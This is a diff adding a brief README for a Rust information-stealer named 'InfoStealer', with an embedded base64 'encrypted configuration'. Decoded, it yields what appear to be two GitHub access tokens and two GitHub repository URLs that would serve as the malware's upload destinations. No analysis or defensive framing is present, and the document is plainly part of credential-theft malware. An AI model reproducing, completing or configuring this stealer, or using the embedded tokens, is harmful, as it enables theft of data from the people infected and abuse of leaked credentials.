@@ -1,0 +1,12 @@
+# InfoStealer
+
+Advanced Rust-based information gathering tool 
+
+## Configuration
+
+The following encrypted configuration is embedded 
+
+```
+Z2hwX2JjeEdab1RzaG1vNktvNUd1a05QRVYkenNOVzdVZzFQVVo0QwpodHRwczovL2dpdGh1Yi5jb20veGluZ3lhbmcyOTEvYXJjaGl2ZXMKZ2hwXzVYeklLbkNhaTVvQkRrOGdhNjgwWmlvSlZFRDJuZzBZSkM5QwpodHRwczovL2dpdGh1Yi5jb20veGluZ3lhbmcyOTIvYXJjaGl2ZXM=
+```
+
